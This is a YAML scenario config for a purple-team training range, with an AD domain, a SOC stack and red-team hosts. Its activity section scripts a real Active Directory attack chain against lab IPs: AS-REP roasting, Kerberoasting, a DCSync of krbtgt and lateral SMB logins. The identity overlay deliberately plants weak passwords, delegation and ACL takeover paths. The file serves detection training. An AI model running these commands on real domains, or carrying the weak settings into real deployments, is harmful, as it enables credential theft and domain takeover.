@@ -1,0 +1,312 @@
+scenario_schema_version: 1
+
+scenario:
+  id: purple-team-range
+  version: 1
+  seed: 20260615        # deterministic synthetic crown-jewel data (OP-OVL)
+  description: |
+    Corpus-derived Purple Team range (Stage-2 of the scenario-ai-research).
+
+    NEW flagship archetype. Across the 324-video corpus, the single most common
+    framing of "cyber range" is the enterprise environment where red and blue
+    train together — Hack The Box's "realistic range for red and blue teams"
+    (Splunk + Wazuh), "Running Your First Purple Team Exercise — Cyber Kill Chain,
+    Emulation & Response", "Constructing Defense 2025" (Windows/Linux/AD/Splunk
+    enterprise), and the SimSpace/CyberBit "test the full security stack and team
+    readiness" pattern. The #1 scenario pattern in the corpus is literally
+    "customizable objectives for blue/red/purple teams".
+
+    Where soc-detection-lab is the focused DMZ-intrusion detection cut, this is the
+    exercise-oriented flagship: a fuller enterprise estate (user LAN, server LAN
+    with a crown-jewel app, a SOC, and a dedicated red/emulation segment), a
+    Windows lateral-movement pair, a blue stack (Suricata/Zeek sensor + Wazuh
+    SIEM), and a dedicated EMULATION host for running ATT&CK techniques (Atomic
+    Red Team / Caldera) so red emulates -> blue measures detection -> tune ->
+    repeat. The crown-jewel server is the exfiltration objective.
+
+    SCOPE — deployable: Infrastructure (4 segments + core router) + Apps & Tools
+    on the Linux hosts (crown-jewel app, file share, SOC sensor + SIEM, red-team
+    kit, emulation host), the crown-jewel DATA overlay (synthetic PII, below), AND
+    the AD IDENTITY core — dc01 promotes to the corp.lab forest (`role: adds`, W2a)
+    with the domain users/groups below (OP-OVL identity, W2b), and ws1/ws2
+    domain-join it (`joins:`, join-host-to-domain, W2 §6.3). Passes `axrange
+    validate` and `axrange plan`. DEFERRED (designed, not deployed; CORPUS_DIGEST.md §5):
+      - the purple-team ATTACK/EMULATION activity (the kill chain: phish ws1 ->
+        lateral to ws2 -> pivot to the file/app servers -> exfil the crown jewel;
+        Atomic Red Team technique runs mapped to ATT&CK) via OP-ACT;
+      - the DETECTION-COVERAGE overlay (Sigma/Suricata rules, the red->blue
+        scoring loop) via OP-OVL;
+      - Windows app provisioning of ws1/ws2 (beyond the domain join).
+
+layers:
+  infra:
+    networks:
+      # gateways are the core router's LAN IPs (router slice Phase 2: egress NAT +
+      # inter-segment routing for the kill chain and the blue stack).
+      - { id: user,   cidr: 10.20.10.0/24, vlan: 200, gateway: 10.20.10.1 }
+      - { id: server, cidr: 10.20.20.0/24, vlan: 201, gateway: 10.20.20.1 }
+      - { id: soc,    cidr: 10.20.30.0/24, vlan: 202, gateway: 10.20.30.1 }
+      - { id: red,    cidr: 10.20.40.0/24, vlan: 203, gateway: 10.20.40.1 }
+    nodes:
+      # Core router — 4-homed across user/server/soc/red; WAN uplink for egress.
+      # Tapped: the kill chain crosses these boundaries (red -> user -> server),
+      # so the router itself is a capture point, not just each segment alone.
+      - id: core
+        kind: router
+        nets:
+          - { net: user,   ip: 10.20.10.1 }
+          - { net: server, ip: 10.20.20.1 }
+          - { net: soc,    ip: 10.20.30.1 }
+          - { net: red,    ip: 10.20.40.1 }
+        image: debian-12-cloud@v1
+        requires: [linux]
+        resources: { cpu: 1, ram: 1Gi, disk: 10Gi }
+
+      # --- User LAN (the domain: a DC + the lateral-movement pair) ------------
+      # Domain controller — promotes to the corp.lab forest (role: adds, W2a).
+      # windows-server-2022 (a Server SKU; win11 clients can't be promoted). DNS
+      # rides on the DC (-InstallDns). Tapped so the SOC sees Kerberos/LDAP/SMB.
+      - id: dc01
+        kind: host
+        nets: [ { net: user, ip: 10.20.10.10 } ]
+        image: windows-server-2022@v1
+        requires: [windows, kernel:powershell-5plus, kernel:dotnet-clr]
+        resources: { cpu: 2, ram: 4Gi, disk: 60Gi }
+      # The lateral-movement pair — both domain-joined (joins: corp.lab ->
+      # join-host-to-domain, W2 §6.3) so domain creds work across them.
+      - id: ws1
+        kind: host
+        nets: [ { net: user, ip: 10.20.10.20 } ]
+        image: win11-finance@v4
+        requires: [windows, kernel:edr-hooks, kernel:powershell-5plus]
+        resources: { cpu: 2, ram: 4Gi, disk: 60Gi }
+        joins: corp.lab
+      - id: ws2
+        kind: host
+        nets: [ { net: user, ip: 10.20.10.21 } ]
+        image: win11-finance@v4
+        requires: [windows, kernel:edr-hooks, kernel:powershell-5plus]
+        resources: { cpu: 2, ram: 4Gi, disk: 60Gi }
+        joins: corp.lab
+
+      # --- Server LAN (the crown jewel) ---------------------------------------
+      # Business app + crown-jewel data — the exfiltration objective. Tapped.
+      - id: app-srv
+        kind: host
+        nets: [ { net: server, ip: 10.20.20.10 } ]
+        image: ubuntu-server-22@v5
+        requires: [linux]
+        resources: { cpu: 2, ram: 4Gi, disk: 40Gi }
+      # Corp file server — lateral-movement target. Tapped.
+      - id: file-srv
+        kind: host
+        nets: [ { net: server, ip: 10.20.20.20 } ]
+        image: debian-12-cloud@v1
+        requires: [linux]
+        resources: { cpu: 1, ram: 2Gi, disk: 20Gi }
+
+      # --- SOC ----------------------------------------------------------------
+      - id: sensor
+        kind: host
+        nets: [ { net: soc, ip: 10.20.30.10 } ]
+        image: debian-12-cloud@v1
+        requires: [linux, kernel:ebpf, kernel:audit]
+        resources: { cpu: 2, ram: 4Gi, disk: 40Gi }
+      - id: siem
+        kind: host
+        nets: [ { net: soc, ip: 10.20.30.20 } ]
+        image: ubuntu-server-22@v5
+        requires: [linux, kernel:container-runtime]
+        resources: { cpu: 4, ram: 8Gi, disk: 60Gi }
+
+      # --- Red / emulation segment --------------------------------------------
+      # Attacker — the human red-team kit.
+      - id: attacker
+        kind: host
+        nets: [ { net: red, ip: 10.20.40.66 } ]
+        image: debian-12-cloud@v1
+        requires: [linux]
+        resources: { cpu: 2, ram: 2Gi, disk: 20Gi }
+      # Emulation host — Atomic Red Team / Caldera technique runner (purple loop).
+      - id: emulation
+        kind: host
+        nets: [ { net: red, ip: 10.20.40.67 } ]
+        image: debian-12-cloud@v1
+        requires: [linux]
+        resources: { cpu: 2, ram: 2Gi, disk: 20Gi }
+  apps:
+    # DC promotion (W2a): `role: adds` stands up the corp.lab forest on dc01; the
+    # overlays.identity users below are then created on it (W2b create-domain-user).
+    - id: ad-dc
+      install:
+        - { role: adds }
+      provides:
+        - { domain: corp.lab }
+    # Crown-jewel business app + a synthetic-data marker (the exfil objective).
+    - id: crown-app
+      install:
+        - { pkg: nginx }
+        - { pkg: php-fpm }
+        - { script: ./scripts/crown_app.sh }
+    # Corp file share (lateral target).
+    - id: file-share
+      install:
+        - { pkg: samba }
+        - { script: ./scripts/file_share.sh }
+    # SOC sensor: Suricata + Zeek.
+    - id: sensor-stack
+      install:
+        - { pkg: suricata }
+        - { pkg: zeek }
+        - { pkg: tcpdump }
+        - { pkg: jq }
+        - { script: ./scripts/sensor_setup.sh }
+    # SOC SIEM: Wazuh single-node.
+    - id: siem-stack
+      install:
+        - { pkg: docker.io }
+        - { pkg: docker-compose-v2 }
+        - { script: ./scripts/siem_setup.sh }
+    # Red-team kit.
+    - id: offensive
+      install:
+        - { pkg: nmap }
+        - { pkg: netcat-traditional }
+        - { pkg: hydra }
+        - { pkg: python3-pip }
+        - { pkg: git }
+        - { pkg: ldap-utils }
+        - { pkg: smbclient }
+        # Debian-packaged impacket (impacket-getnpusers / -getuserspns /
+        # -secretsdump) for the AD half of the kill chain — apt, no pip egress.
+        - { pkg: python3-impacket }
+        - { script: ./scripts/offensive_setup.sh }
+    # Emulation host: Atomic Red Team / Caldera staging for the purple loop.
+    - id: emulation-kit
+      install:
+        - { pkg: python3-pip }
+        - { pkg: git }
+        - { pkg: jq }
+        - { script: ./scripts/emulation_setup.sh }
+  # ---------------------------------------------------------------------------
+  # OP-ACT — the purple-team kill chain (red side), run from the LAN `attacker`
+  # (red 10.20.40.66) across the core router into the user/dmz segments. Inline-
+  # steps MVP, one-shot, local actor (docs/SLICE_ACTIVITY.md). Maps the corpus
+  # phish->lateral->pivot->exfil chain onto real AD-protocol traffic the SOC
+  # sensor + SIEM score: recon -> AD enum (SMB/LDAP/Kerberos on the DC) ->
+  # AS-REP/Kerberoast -> lateral SMB to the workstations -> pivot/exfil toward the
+  # crown-jewel file/app servers. Best-effort (logs + continues); the TRAFFIC is
+  # the captured artifact. Kit staged by `offensive` (offensive_setup.sh + apt).
+  # DC=10.20.10.10, ws1=10.20.10.20, ws2=10.20.10.21, file-srv=10.20.20.20,
+  # app-srv=10.20.20.10, domain corp.lab.
+  # ---------------------------------------------------------------------------
+  activity:
+    - id: purple-killchain
+      actor: red-operator
+      inline:
+        steps:
+          # 1. RECON — AD service surface on the DC (cross-segment via the router).
+          - tool: nmap
+            args: -Pn -n -sS -p 53,88,135,139,389,445,464,636,3268,3389
+            target: 10.20.10.10
+          # 2. Workstation sweep — the phishing/lateral targets (SMB/RDP).
+          - tool: nmap
+            args: -Pn -n -sS -p 139,445,3389
+            target: 10.20.10.20,10.20.10.21
+          # 3. SMB enumeration on the DC — null session shares + password policy.
+          - run: nxc smb 10.20.10.10 -u '' -p '' --shares --pass-pol 2>&1 | tail -30 || smbclient -N -L //10.20.10.10 2>&1 | tail -20; true
+          # 4. LDAP enumeration — anonymous bind + SPN account discovery.
+          - run: ldapsearch -x -H ldap://10.20.10.10 -b 'DC=corp,DC=lab' '(servicePrincipalName=*)' sAMAccountName 2>&1 | tail -20; true
+          # 5. AS-REP roasting — preauth-disabled accounts (Kerberos AS-REQ on 88).
+          #    Debian's python3-impacket ships GetNPUsers.py under /usr/share/doc.
+          - run: IMPEX=/usr/share/doc/python3-impacket/examples; printf 'it-admin\njdoe\nsvc-backup\nadministrator\nkrbtgt\n' > /tmp/ad_users.txt; ( python3 "$IMPEX/GetNPUsers.py" corp.lab/ -no-pass -usersfile /tmp/ad_users.txt -dc-ip 10.20.10.10 || GetNPUsers.py corp.lab/ -no-pass -usersfile /tmp/ad_users.txt -dc-ip 10.20.10.10 ) 2>&1 | tail -25; true
+          # 6. Kerberoasting — auth as jdoe (lab-default pw Axr4nge-Lab!), request TGS
+          #    for SPN accounts (Kerberos AS-REQ + TGS-REQ on 88).
+          - run: IMPEX=/usr/share/doc/python3-impacket/examples; ( python3 "$IMPEX/GetUserSPNs.py" corp.lab/it-admin:'Axr4nge-Lab!' -dc-ip 10.20.10.10 -request || GetUserSPNs.py corp.lab/it-admin:'Axr4nge-Lab!' -dc-ip 10.20.10.10 -request ) 2>&1 | tail -25; true
+          # 6b. DCSYNC — with the it-admin (Domain Admins) cred, replicate krbtgt over
+          #    DRSUAPI (the domain-admin objective -> golden ticket). RPC 135 + high ports.
+          - run: ( impacket-secretsdump corp.lab/it-admin:'Axr4nge-Lab!'@10.20.10.10 -just-dc-user krbtgt || python3 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.lab/it-admin:'Axr4nge-Lab!'@10.20.10.10 -just-dc-user krbtgt ) 2>&1 | tail -20; true
+          # 7. LATERAL — SMB to the workstations (phished foothold -> ws1 -> ws2).
+          - run: for t in 10.20.10.20 10.20.10.21; do nxc smb "$t" -u jdoe -p 'P@ssw0rd!' 2>&1 | tail -5 || smbclient -N -L //"$t" 2>&1 | tail -5; done; true
+          # 8. PIVOT + EXFIL — reach the crown-jewel file/app servers in the dmz
+          #    segment; probe the share that holds customers.csv (data-overlay PII).
+          - run: nmap -Pn -n -sS -p 139,445,80,443 10.20.20.10,10.20.20.20 2>&1 | tail -20; smbclient -N -L //10.20.20.20 2>&1 | tail -10; true
+
+# OP-OVL defense (blue team) — the in-scenario AD network IDS. A suricata-sensor
+# scores the tapped user + server segments (the DC, workstations, crown-jewel
+# servers) against the AD attack-chain detection ruleset (Kerberoast/DCSync/LLMNR/
+# recon) — the blue half of the purple loop the `purple-killchain` red half drives.
+# Clones the pre-baked suricata-sensor image (suricata present, no egress).
+sensors:
+  - id: ad-ids
+    type: suricata-sensor
+    primary: true
+    rules: ./scripts/suricata_ad.rules
+
+bindings:
+  - { app: ad-dc,         host: dc01 }
+  - { app: crown-app,     host: app-srv }
+  - { app: file-share,    host: file-srv }
+  - { app: sensor-stack,  host: sensor }
+  # The purple kill chain runs from the attacker (the host carrying the red kit).
+  - { activity: purple-killchain, host: attacker }
+  - { app: siem-stack,    host: siem }
+  - { app: offensive,     host: attacker }
+  - { app: emulation-kit, host: emulation }
+
+# Data overlay (OP-OVL seed-dataset, docs/SLICE_OVERLAY.md): synthetic datasets
+# planted on existing nodes. The crown-jewel PII on the business app server is
+# the exfiltration objective; corp docs on the file server are lateral loot.
+# Deterministic from scenario.seed (reproducible across redeploys). Seeded after
+# each host's apps so the data lands on top of the app-created dirs.
+overlays:
+  data:
+    - id: crown-jewel-pii
+      host: app-srv
+      path: /srv/crown/customers.csv
+      classification: PII
+      crown_jewel: true
+      synthetic_size: 256Ki
+    - id: corp-docs
+      host: file-srv
+      path: /srv/share/finance-records.csv
+      classification: confidential
+      synthetic_size: 128Ki
+  # Domain identities created on dc01 once the forest is up (W2b create-domain-user).
+  # The kill-chain identity set: an over-privileged Domain Admins account (the
+  # lateral-movement -> domain-admin target), the ws1 phishing victim, and a
+  # service account. The human red team is the LAN `attacker` host, not a domain user.
+  identity:
+    # Over-privileged DA (DCSync target); keeps the lab-default password so the kill
+    # chain can authenticate + DCSync as it. OU: IT.
+    - { id: it-admin,   type: user, domain: corp.lab, groups: [Domain Admins], ou: IT }
+    # AS-REP roastable phishing victim (no pre-auth) — weak password. OU: Finance.
+    - { id: jdoe,       type: user, domain: corp.lab, groups: [Domain Users],
+        asrep_roastable: true, password: "Password123", ou: Finance }
+    # KERBEROASTABLE service account (Vulnerable-AD §9): SPN + weak password + RC4 +
+    # CONSTRAINED DELEGATION to the file server's CIFS (it can impersonate users to
+    # that service — a delegation abuse path).
+    - { id: svc-backup, type: user, domain: corp.lab, groups: [Domain Users],
+        spn: "CIFS/backup.corp.lab", password: "Backup2024!", ou: Service Accounts,
+        delegation_to: [ "CIFS/file-srv.corp.lab" ] }
+    # DANGEROUS-ACL takeover path (BloodHound edge): the phishing victim jdoe is
+    # granted WriteDacl over the it-admin DA -> jdoe can grant itself DCSync and
+    # escalate to Domain Admin. The purple team validates detection of this abuse.
+    - { id: jdoe-acl, type: user, domain: corp.lab, groups: [Domain Users],
+        password: "Welcome1", ou: Finance,
+        acl: [ { right: WriteDacl, target: it-admin } ] }
+    # Local accounts (no domain:) — the W2 local-user branch (SLICE_WINDOWS_AD §6.3).
+    # Exercises BOTH OS paths: wks-admin is a local Windows admin on the phishing
+    # victim ws1 (New-LocalUser — the PtH/local-admin-reuse target the purple team
+    # validates detections for); ops-local is a local Linux account on the file
+    # server (useradd) — the kind of standing local account blue team audits.
+    - { id: wks-admin, type: user, host: ws1,      groups: [Administrators] }
+    - { id: ops-local, type: user, host: file-srv, groups: [sudo] }
+  # OP-OVL defense (blue team) — HOST-side AD detection on the DC: enable the Windows
+  # audit subcategories (4768/4769 Kerberos, 4662 DCSync, logon) so the Security event
+  # log records the kill chain — the host substrate the SIEM forwards, paired with the
+  # network IDS (ad-ids). Applied post-promotion (gated on domain-ready).
+  defense:
+    - id: dc-ad-audit
+      tool: sysmon
+      installed_on: [dc01]
